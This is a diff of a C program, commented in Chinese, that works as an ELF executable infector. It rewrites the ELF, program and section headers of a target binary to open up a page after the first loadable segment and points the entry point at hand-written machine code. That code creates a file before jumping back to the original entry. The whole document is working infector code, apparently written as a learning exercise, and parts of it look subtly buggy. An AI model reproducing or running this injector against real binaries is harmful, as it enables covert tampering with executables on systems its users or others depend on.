@@ -1,17 +1,24 @@
 #include <stdio.h>
 #include <unistd.h>
-#include <elf.h>
-#include <fcntl.h>
 #include <stdlib.h>
-//暂定为4096，即默认被插入的代码大小 < 4096
-#define pageSize 4096
+#include <elf.h>
+#include <sys/types.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#include <string.h>
 
-Elf64_Addr program_head_vaddr;
-Elf64_Xword program_head_size;
-Elf64_Off entry_section_offset;
-Elf64_Xword entry_section_size;
+//一页的大小，默认 4K
+#define PAGESIZE 4096
 
-void workOutAddr(int value, int arr[])
+// 计算新的地址，如：数据段地址，跳转地址等
+void cal_addr(int value, int arr[]);
+// 注入函数
+void inject(char *elf_file);
+// 插入函数
+void insert(Elf64_Ehdr elf_ehdr, int old_file, int old_entry, int old_phsize);
+
+// 计算新的地址
+void cal_addr(int value, int arr[])
 {
     int a = value / (16 * 16);
     int b = value % (16 * 16);
@@ -22,32 +29,143 @@ void workOutAddr(int value, int arr[])
     arr[1] = b2;
     arr[2] = a2;
 }
-
-void insert(Elf64_Addr new_entry, Elf64_Addr orig_entry, int origfile, int dirSecTail)
+// 判断是否是一个 ELF 文件
+int is_elf(Elf64_Ehdr elf_ehdr)
 {
-    //需要修改跳转指令中的目的地址为原入口地址
-    int ori_arr[3];
-    workOutAddr(orig_entry, ori_arr);
+    // ELF文件头部的 e_ident 为 "0x7fELF"
+    if ((strncmp(elf_ehdr.e_ident, ELFMAG, SELFMAG)) != 0)
+        return 0;
+    else
+        return 1; // 相等时则是
+}
 
-    //计算出数据的地址,扔到将插入的代码中
-    int dataEntry = new_entry + 73;
-    int data_arr[3];
-    workOutAddr(dataEntry, data_arr);
+//Infector Function
+void inject(char *elf_file)
+{
+    printf("开始注入\n");
+    int old_entry;
+    int old_shoff;
+    int old_phsize;
 
-    //机器码。作用是创建一个文件写入字符串
-    //其中0x5*是将压栈与弹栈保护其中原始内容
-    char binary[] = {
+    // ELF Header Table 结构体
+    Elf64_Ehdr elf_ehdr;
+    // Program Header Table 结构体
+    Elf64_Phdr elf_phdr;
+    // Section Header Table 结构体
+    Elf64_Shdr elf_shdr;
+
+    // 打开文件并读取ELF头信息到 elf_ehdr 上
+    int old_file = open(elf_file, O_RDWR);
+    read(old_file, &elf_ehdr, sizeof(elf_ehdr));
+
+    // 判断是否是一个 ELF 文件
+    if (!is_elf(elf_ehdr))
+    {
+        printf("此文件不是 ELF 文件\n");
+        exit(0);
+    }
+
+    // elf 文件的原入口地址
+    old_entry = elf_ehdr.e_entry;
+    //elf 文件 节区头部表格的原偏移量
+    old_shoff = elf_ehdr.e_shoff;
+
+    // 节区头部表格的偏移量增加一页
+    elf_ehdr.e_shoff += PAGESIZE;
+
+    int flag = 0;
+    int i = 0;
+
+    printf("开始修改程序头部表\n");
+    // 读取并修改程序头部表
+    for (i = 0; i < elf_ehdr.e_phnum; i++)
+    {
+        // 寻找并读取到 elf_phdr 中
+        lseek(old_file, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
+        read(old_file, &elf_phdr, sizeof(elf_phdr));
+        if (flag)
+        {
+            // 增加 p_offset 一页大小 4k
+            elf_phdr.p_offset += PAGESIZE;
+            // 寻找并更新 程序头部
+            lseek(old_file, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
+            write(old_file, &elf_phdr, sizeof(elf_phdr));
+        }
+        else if (PT_LOAD == elf_phdr.p_type && elf_phdr.p_offset == 0)
+        { // 数组元素可加载的段，程序段入口
+
+            if (elf_phdr.p_filesz != elf_phdr.p_memsz)
+                exit(0);
+
+            // 修改新的程序入口虚拟地址
+            elf_ehdr.e_entry = elf_phdr.p_vaddr + elf_phdr.p_filesz;
+            // 寻找并更新 ELF 头部
+            lseek(old_file, 0, SEEK_SET);
+            write(old_file, &elf_ehdr, sizeof(elf_ehdr));
+            old_phsize = elf_phdr.p_filesz;
+
+            // 增加 p_filesz 和 p_memsz 一页大小 4k
+            elf_phdr.p_filesz += PAGESIZE;
+            elf_phdr.p_memsz += PAGESIZE;
+
+            // 更新程序头部表
+            lseek(old_file, elf_ehdr.e_phoff + i * elf_ehdr.e_phentsize, SEEK_SET);
+            write(old_file, &elf_phdr, sizeof(elf_phdr));
+            flag = 1;
+        }
+    }
+
+    printf("开始修改节区头部表\n");
+    // 读取并修改节区头部表
+    for (i = 0; i < elf_ehdr.e_shnum; i++)
+    {
+        // 寻找并读取节区头部表
+        lseek(old_file, i * sizeof(elf_shdr) + old_shoff, SEEK_SET);
+        read(old_file, &elf_shdr, sizeof(elf_shdr));
+        if (i == 0)
+        {
+            // 第一个节区增加一页
+            elf_shdr.sh_size += PAGESIZE;
+        }
+        else
+        {
+            // 节区偏移地址增加一页
+            elf_shdr.sh_offset += PAGESIZE;
+        }
+        // 寻找并更新节区头部表
+        lseek(old_file, old_shoff + i * sizeof(elf_shdr), SEEK_SET);
+        write(old_file, &elf_shdr, sizeof(elf_shdr));
+    }
+
+    printf("开始插入注入程序\n");
+    // 插入注入程序
+    insert(elf_ehdr, old_file, old_entry, old_phsize);
+}
+
+void insert(Elf64_Ehdr elf_ehdr, int old_file, int old_entry, int old_phsize)
+{
+    // 程序的原始入口地址
+    int old_entry_addr[3];
+    cal_addr(old_entry, old_entry_addr);
+
+    // 数据段的地址, 73 为数组中程序数据段的相对位置
+    int data_entry = elf_ehdr.e_entry + 73;
+    int data_addr[3];
+    cal_addr(data_entry, data_addr);
+
+    // 每一行对应一条汇编代码
+    char inject_code[] = {
         0x50,
         0x53,
         0x51,
         0x52,
         0x48, 0xc7, 0xc0, 0x08, 0x00, 0x00, 0x00,
-        0x48, 0xc7, 0xc3, data_arr[0], data_arr[1], data_arr[2], 0x00,
+        0x48, 0xc7, 0xc3, data_addr[0], data_addr[1], data_addr[2], 0x00,
         0x48, 0xc7, 0xc1, 0xa4, 0x01, 0x00, 0x00,
         0xcd, 0x80,
         0x48, 0x89, 0xc3,
         0x48, 0xc7, 0xc0, 0x04, 0x00, 0x00, 0x00,
-        0x48, 0xc7, 0xc1, data_arr[0], data_arr[1], data_arr[2], 0x00,
+        0x48, 0xc7, 0xc1, data_addr[0], data_addr[1], data_addr[2], 0x00,
         0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00,
         0xcd, 0x80,
         0x48, 0xc7, 0xc0, 0x06, 0x00, 0x00, 0x00,
@@ -56,144 +174,47 @@ void insert(Elf64_Addr new_entry, Elf64_Addr orig_entry, int origfile, int dirSe
         0x59,
         0x5b,
         0x58,
+        //跳转指令 "movl Oldentry, %eax"
+        0xbd, old_entry_addr[0], old_entry_addr[1], old_entry_addr[2], 0x00, 0xff, 0xe5,
+        //数据区域 hhhhh
+        0x68, 0x68, 0x68, 0x68, 0x68, 0x00};
+    int inject_size = sizeof(inject_code);
 
-        //跳转指令
-        0xbd, ori_arr[0], ori_arr[1], ori_arr[2], 0x00, 0xff, 0xe5,
+    // 防止注入代码太大
+    if (inject_size > (PAGESIZE - (elf_ehdr.e_entry % PAGESIZE)))
+    {
+        printf("注入代码太大\n");
+        exit(0);
+    }
 
-        //数据区域
-        0x68, 0x68, 0x68, 0x68, 0x68, 0x00
+    struct stat file_stat;
+    fstat(old_file, &file_stat);
+    char *data = (char *)malloc(file_stat.st_size - old_phsize);
 
-    };
+    // 存储原程序从节区末尾到目标节区头的数据
+    lseek(old_file, old_phsize, SEEK_SET);
+    read(old_file, data, file_stat.st_size - old_phsize);
 
-    //将机器码插入
-    printf("插入代码\n");
-    lseek(origfile, dirSecTail, 0);
-    write(origfile, binary, sizeof(binary));
+    // 插入注入代码到原 elf 文件中
+    lseek(old_file, old_phsize, SEEK_SET);
+    write(old_file, inject_code, inject_size);
 
-    //对齐
-    printf("对齐代码\n");
-    char tmp[pageSize - sizeof(binary)] = {0};
-    write(origfile, tmp, pageSize - sizeof(binary));
+    char tmp[PAGESIZE] = {0};
+    // 扩充到一页
+    memset(tmp, PAGESIZE - inject_size, 0);
+    write(old_file, tmp, PAGESIZE - inject_size);
+    write(old_file, data, file_stat.st_size - old_phsize);
+    free(data);
 }
 
 int main(int argc, char **argv)
 {
-    /**
-   * 读取ELF文件头信息
-   */
-    //存储器
-    char elf_ehdr[sizeof(Elf64_Ehdr)];
-    Elf64_Ehdr *p_ehdr = (Elf64_Ehdr *)elf_ehdr;
-
-    printf("打开文件并读取ELF头信息\n");
-    int origfile = open(argv[1], O_RDWR);
-    read(origfile, elf_ehdr, sizeof(elf_ehdr));
-    //保存原入口地址
-    Elf64_Addr orig_entry = p_ehdr->e_entry;
-
-    /**
-   * 读取并修改程序头
-   */
-    //存储器
-    char elf_phdr[sizeof(Elf64_Phdr)];
-    Elf64_Phdr *p_phdr = (Elf64_Phdr *)elf_phdr;
-    int perProHeadSize = sizeof(elf_phdr);
-
-    int flag = 0, i;
-    int programHeadNum = (int)p_ehdr->e_phnum;
-    for (i = 0; i < programHeadNum; i++)
+    //检查参数数量是否正确
+    if (argc != 2)
     {
-        read(origfile, elf_phdr, sizeof(Elf64_Phdr));
-        if (flag == 0 && p_phdr->p_vaddr <= orig_entry && (p_phdr->p_vaddr + p_phdr->p_filesz) > orig_entry)
-        {
-            //找到程序段入口
-            printf("找到了目标程序段\n");
-            flag = 1;
-            program_head_vaddr = p_phdr->p_vaddr;
-            program_head_size = p_phdr->p_filesz;
-
-            p_phdr->p_filesz += pageSize;
-            p_phdr->p_memsz += pageSize;
-
-            lseek(origfile, -perProHeadSize, 1);
-            write(origfile, elf_phdr, perProHeadSize);
-        }
-        else if (flag != 0)
-        {
-            p_phdr->p_offset += pageSize;
-            lseek(origfile, -perProHeadSize, 1);
-            write(origfile, elf_phdr, perProHeadSize);
-        }
+        printf("缺少 elf 文件参数，格式：./main <elf_filepath>\n");
+        exit(0);
     }
-
-    /**
-   * 读取并修改节头
-   */
-    //将节头向下移
-    //要先获得 节区的数量 以及 单个节区头部的大小
-    int sectionNum = (int)p_ehdr->e_shnum;
-    int perSecHeadSize = p_ehdr->e_shentsize;
-    int secHeadSize = sectionNum * perSecHeadSize;
-    //存储器
-    char elf_shdr[sizeof(Elf64_Shdr)];
-    Elf64_Shdr *p_shdr = (Elf64_Shdr *)elf_shdr;
-
-    int s_i;
-    int dirSecHeadOff;
-    Elf64_Addr new_entry;
-    for (i = sectionNum - 1; i >= 0; i--)
-    {
-        lseek(origfile, p_ehdr->e_shoff + i * perSecHeadSize, 0);
-        read(origfile, elf_shdr, sizeof(elf_shdr));
-        if (p_shdr->sh_addr + p_shdr->sh_size == program_head_vaddr + program_head_size)
-        {
-            entry_section_offset = p_shdr->sh_offset;
-            entry_section_size = p_shdr->sh_size;
-            new_entry = p_shdr->sh_addr + p_shdr->sh_size;
-            s_i = i;
-
-            dirSecHeadOff = p_ehdr->e_shoff + i * sizeof(elf_shdr);
-            printf("找到了目标节区的节区头的偏移：%04x\n", dirSecHeadOff);
-            p_shdr->sh_size += pageSize;
-        }
-        else
-        {
-            //改其offset值
-            p_shdr->sh_offset += pageSize;
-        }
-
-        lseek(origfile, pageSize - sizeof(elf_shdr), 1);
-        write(origfile, elf_shdr, sizeof(elf_shdr));
-
-        if (s_i != 0)
-        {
-            break;
-        }
-    }
-
-    int dirSecTail = entry_section_offset + entry_section_size;
-    printf("找到了目标节区的末尾：%04x\n", dirSecTail);
-    int dirSecTail_dirSecHeadOff = dirSecHeadOff - dirSecTail;
-    printf("找到了从 目标节区末尾 到目标节区头 的长度：%04x\n", dirSecTail_dirSecHeadOff);
-    //这段内容保存着从 目标节区末尾 到目标节区头 的内容
-    char con[dirSecTail_dirSecHeadOff];
-    lseek(origfile, dirSecTail, 0);
-    read(origfile, con, dirSecTail_dirSecHeadOff);
-
-    //将指针移到目标节区尾部，写入这一大段内容
-    printf("将这一段下移\n");
-    lseek(origfile, dirSecTail + pageSize, 0);
-    write(origfile, con, dirSecTail_dirSecHeadOff);
-    insert(new_entry, orig_entry, origfile, dirSecTail);
-
-    /**
-   * 修改ELF头
-   */
-    printf("修改ELF头\n");
-    p_ehdr->e_entry = new_entry;
-    p_ehdr->e_shoff += pageSize;
-    lseek(origfile, 0, 0);
-    write(origfile, elf_ehdr, sizeof(elf_ehdr));
-
-    close(origfile);
+    inject(argv[1]);
+    return 0;
 }
